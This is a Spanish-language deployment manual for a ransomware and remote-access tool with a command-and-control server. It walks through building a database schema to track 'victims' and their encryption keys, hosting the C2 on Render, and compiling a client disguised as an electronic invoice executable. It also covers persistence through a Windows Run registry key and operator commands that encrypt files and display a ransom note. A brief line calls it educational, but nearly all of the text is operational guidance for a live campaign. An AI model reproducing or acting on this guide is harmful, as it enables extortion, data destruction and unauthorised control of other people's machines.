# 📦 Instrucciones de Despliegue e Instalación

## 1. Configuración de la Base de Datos (Supabase)

Para persistencia de datos (víctimas, claves, archivos cifrados), usamos **Supabase** como base de datos PostgreSQL en la nube.

### Paso 1: Crear Proyecto en Supabase
1. Ve a [Supabase](https://supabase.com) y crea una cuenta gratuita.
2. Crea un nuevo proyecto (ej: `c2-database`).
3. Espera a que se inicialice (~2 minutos).

### Paso 2: Crear las Tablas
Ve a **SQL Editor** en Supabase y ejecuta el siguiente script:

```sql
-- Tabla de víctimas (información del sistema infectado)
CREATE TABLE victims (
  id SERIAL PRIMARY KEY,
  uuid TEXT UNIQUE,
  socket_id TEXT,
  hostname TEXT,
  username TEXT,
  ip TEXT,
  platform TEXT,
  arch TEXT,
  os_version TEXT,
  cpu_model TEXT,
  total_memory TEXT,
  status TEXT DEFAULT 'connected',
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Tabla de claves de cifrado
CREATE TABLE keys (
  id SERIAL PRIMARY KEY,
  uuid TEXT,
  socket_id TEXT,
  hostname TEXT,
  aes_key TEXT,
  encrypted_aes_key TEXT,  -- Clave AES cifrada con RSA (Base64)
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Tabla de archivos cifrados
CREATE TABLE encrypted_files (
  id SERIAL PRIMARY KEY,
  uuid TEXT,
  hostname TEXT,
  file_name TEXT,
  original_name TEXT,
  directory TEXT,
  iv TEXT,
  aes_key TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Índices para mejor rendimiento
CREATE INDEX idx_victims_uuid ON victims(uuid);
CREATE INDEX idx_keys_uuid ON keys(uuid);
CREATE INDEX idx_encrypted_files_uuid ON encrypted_files(uuid);
```

### Paso 3: Obtener Credenciales
1. Ve a **Settings > API** en tu proyecto Supabase.
2. Copia:
   - **Project URL** (ej: `https://xxxx.supabase.co`)
   - **anon public key** (clave larga que empieza con `eyJ...`)

---

## 2. Instalación del Servidor

### Opción A: Render (Producción)

1. Sube el código a tu repositorio de GitHub.
2. Crea un nuevo **Web Service** en [Render.com](https://render.com) conectado a tu repo.
3. En **Environment Variables** añade:
   ```
   SUPABASE_URL=https://tu-proyecto.supabase.co
   SUPABASE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   ```
4. El autodespliegue se encargará del resto usando `render.yaml`.

**URL de producción**: `https://proyectoseguridad-pnzo.onrender.com`

### Opción B: Local (Desarrollo/Pruebas)

1. Crea un archivo `.env` en la raíz del proyecto:
   ```env
   SUPABASE_URL=https://tu-proyecto.supabase.co
   SUPABASE_KEY=tu-clave-anon-public
   PORT=3000
   ```

2. Instalar dependencias:
   ```bash
   npm install
   ```

3. Iniciar servidor:
   ```bash
   npm start
   ```

4. Acceder al dashboard: `http://localhost:3000`

---

## 3. Estructura del Proyecto

```
C2/
├── server.js              # Servidor C2 principal (Express + Socket.IO)
├── cliente.js             # Cliente RAT (se compila a .exe)
├── interfazdeaviso.py     # Nota de rescate (PyQt6)
├── build.js               # Script de compilación automática
├── render.yaml            # Configuración para Render.com
├── package.json           # Dependencias Node.js
├── .env                   # Variables de entorno (NO subir a Git)
│
├── public/                # Dashboard Web
│   ├── index.html         # Panel principal
│   ├── database.html      # Visualización de BD
│   ├── consola.html       # Consola remota
│   ├── css/               # Estilos
│   └── js/                # JavaScript frontend
│       ├── main.js        # Lógica del panel principal
│       └── database.js    # Lógica de la pestaña BD
│
├── keys/                  # Almacén de claves RSA (NO subir a Git)
│   ├── server_private.pem # Clave RSA privada del servidor
│   ├── server_public.pem  # Clave RSA pública
│   └── [hostname]_key.txt # Backups locales de claves AES
│
├── dist/                  # Ejecutables compilados
│   └── Factura_Electronica_Enero2026.exe
│
└── docs/                  # Documentación
    ├── MANUAL_OPERACIONES.md
    ├── MANUAL_TECNICO.md
    └── INSTRUCCIONES.md
```

---

## 4. Compilación del Cliente (Malware)

### Requisitos Previos
* Node.js v18+ instalado
* Python 3.10+ con PyInstaller (opcional, para nota de rescate)
* Conocer la URL de tu servidor

### Pasos de Compilación

1. **Editar servidor en cliente.js**:
   ```javascript
   const SERVERS = [
     'https://tu-servidor.onrender.com',  // Producción
     'http://localhost:3000'               // Desarrollo
   ];
   ```

2. **Compilar ejecutable**:
   ```bash
   npm run build-client
   ```

3. **Salida en `dist/`**:
   - `Factura_Electronica_Enero2026.exe` - Cliente principal
   - `Comprobante_Pago_2026.exe` - Nota de rescate (si Python disponible)

### Compilación Manual (alternativa)

```bash
# Instalar pkg globalmente
npm install -g pkg

# Compilar para Windows x64
pkg cliente.js --targets node18-win-x64 --output dist/MiMalware.exe
```

---

## 5. Dashboard - Funcionalidades

### Páginas Disponibles

| Página | URL | Descripción |
|--------|-----|-------------|
| Panel Principal | `/` o `/index.html` | Control de clientes y ejecución de comandos |
| Base de Datos | `/database.html` | Visualización de víctimas, claves y archivos |
| Consola Remota | `/consola.html` | Terminal interactiva para comandos |
| Gestión de Clientes | `/clientes.html` | Lista detallada de clientes |

### Base de Datos (database.html)

**4 pestañas disponibles:**

1. **Víctimas**: Información del sistema infectado
   - UUID, Hostname, Usuario, IP, Plataforma, Estado

2. **Claves**: Claves AES de cada cliente
   - Permite editar y eliminar claves
   - Función de copiar al portapapeles

3. **Archivos Cifrados**: Registro de archivos encriptados
   - Nombre cifrado, original, directorio, IV

4. **Claves RSA**: Par de claves del servidor
   - Clave pública y privada en formato PEM
   - Función de copiar

---

## 6. Sistema de Cifrado Híbrido

### Flujo de Registro (Handshake)

```
1. Cliente se conecta al servidor via Socket.IO
2. Servidor emite 'rsa-handshake' con clave pública RSA
3. Cliente genera clave AES-256 aleatoria localmente
4. Cliente cifra la clave AES con RSA-OAEP-SHA256
5. Cliente envía 'clave-aes-cliente' con la clave cifrada
6. Servidor descifra con clave privada RSA
7. Servidor guarda ambas versiones (plain + cifrada) en Supabase
8. Servidor emite 'registrado' confirmando el handshake
```

### Algoritmos Utilizados

| Propósito | Algoritmo | Detalles |
|-----------|-----------|----------|
| Intercambio de claves | RSA-2048-OAEP | SHA256 como función hash |
| Cifrado de archivos | AES-256-CBC | IV único de 16 bytes por archivo |
| Formato de claves | PEM | PKCS#8 (privada), SPKI (pública) |

---

## 7. Ejecución en la Víctima (VM de Pruebas)

⚠️ **ADVERTENCIA**: Solo ejecutar en máquinas virtuales aisladas para fines educativos.

### Proceso de Infección

1. Enviar el ejecutable `.exe` a la máquina objetivo
2. Al ejecutarse, el malware:
   - Se copia a `%APPDATA%\AdobeReader\`
   - Se registra en el inicio de Windows (Registry Run Key)
   - Se conecta al servidor C2
   - Genera y envía clave AES cifrada con RSA

3. Desde el Dashboard puedes:
   - Ver información del sistema
   - Ejecutar comandos remotos
   - Escanear archivos del sistema
   - Cifrar documentos seleccionados
   - Mostrar nota de rescate
   - Descifrar archivos (recuperación)

### Comandos Disponibles

```bash
# Comandos especiales C2
c2:scan                  # Listar archivos objetivo
c2:encrypt 50            # Cifrar 50 archivos
c2:encrypt-all 100       # Cifrar 100 archivos (cualquier tipo)
c2:decrypt               # Descifrar todos los .cript
c2:ransom                # Mostrar nota de rescate
c2:kill                  # Eliminar persistencia

# Comandos del sistema
dir                      # Listar directorio
whoami                   # Usuario actual
systeminfo               # Info del sistema
```

---

## 8. Variables de Entorno Requeridas

| Variable | Descripción | Ejemplo |
|----------|-------------|---------|
| `SUPABASE_URL` | URL del proyecto Supabase | `https://abc123.supabase.co` |
| `SUPABASE_KEY` | Clave anon/public de Supabase | `eyJhbGciOiJIUzI1...` |
| `PORT` | Puerto del servidor (opcional) | `3000` |

---

## 9. Solución de Problemas Comunes

### "Cannot find module '@supabase/supabase-js'"
```bash
npm install @supabase/supabase-js
```

### "pkg: Targets not specified"
```bash
pkg cliente.js --targets node18-win-x64
```

### Cliente no conecta
1. Verificar URL del servidor en `cliente.js`
2. Confirmar que Render/servidor está activo
3. Revisar firewall/antivirus

### Base de datos vacía
1. Verificar variables SUPABASE_URL y SUPABASE_KEY
2. Confirmar tablas creadas en Supabase
3. Revisar logs del servidor

---

**Última actualización**: 2026-01-13  
**Versión**: 2.0.0